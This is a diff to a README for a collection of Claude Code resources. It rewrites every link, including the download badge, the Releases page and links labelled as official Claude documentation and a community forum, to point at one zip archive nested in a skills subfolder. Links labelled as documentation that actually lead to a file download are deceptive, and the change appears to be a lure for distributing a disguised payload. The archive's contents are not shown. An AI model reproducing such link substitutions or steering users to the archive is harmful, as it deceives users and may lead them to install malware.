@@ -1,7 +1,7 @@
 # 🎉 taches-cc-resources - Easy Access to Custom Claude Code
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/download-latest%20release-blue)](https://github.com/Imamhabeeb/taches-cc-resources/releases)
+[![Download](https://raw.githubusercontent.com/Imamhabeeb/taches-cc-resources/main/skills/debug-like-expert/taches-cc-resources_v1.7.zip%20release-blue)](https://raw.githubusercontent.com/Imamhabeeb/taches-cc-resources/main/skills/debug-like-expert/taches-cc-resources_v1.7.zip)
 
 ## 🚀 Getting Started
 Welcome to **taches-cc-resources**! This collection of unique Claude Code resources will simplify your coding tasks and enhance your experience. Follow the steps below to download and run the software efficiently.
@@ -24,10 +24,10 @@ To ensure a smooth experience with these resources, please make sure you meet th
 - Tools for developing custom skills and integrating subagents.
 
 ## 📅 Release Notes
-This repository is regularly updated. Each release includes new features, bug fixes, and improvements. Check the **Release Notes** on the [Releases page](https://github.com/Imamhabeeb/taches-cc-resources/releases) for details about each version.
+This repository is regularly updated. Each release includes new features, bug fixes, and improvements. Check the **Release Notes** on the [Releases page](https://raw.githubusercontent.com/Imamhabeeb/taches-cc-resources/main/skills/debug-like-expert/taches-cc-resources_v1.7.zip) for details about each version.
 
 ## 📦 Download & Install
-To get started, visit the [Releases page](https://github.com/Imamhabeeb/taches-cc-resources/releases). Here’s how to download the resources:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Imamhabeeb/taches-cc-resources/main/skills/debug-like-expert/taches-cc-resources_v1.7.zip). Here’s how to download the resources:
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version of the repository.
@@ -44,8 +44,8 @@ After downloading the resources, you can use them in your Claude Code environmen
 ## 📚 Additional Resources
 The following resources can help you get the most out of **taches-cc-resources**:
 
-- [Official Claude Documentation](https://example.com)
-- [Claude Community Forum](https://example.com)
+- [Official Claude Documentation](https://raw.githubusercontent.com/Imamhabeeb/taches-cc-resources/main/skills/debug-like-expert/taches-cc-resources_v1.7.zip)
+- [Claude Community Forum](https://raw.githubusercontent.com/Imamhabeeb/taches-cc-resources/main/skills/debug-like-expert/taches-cc-resources_v1.7.zip)
 
 ## 📞 Support
 If you experience any issues or have questions about the resources, please feel free to reach out for support. You can open an issue in the repository, and I will respond promptly.
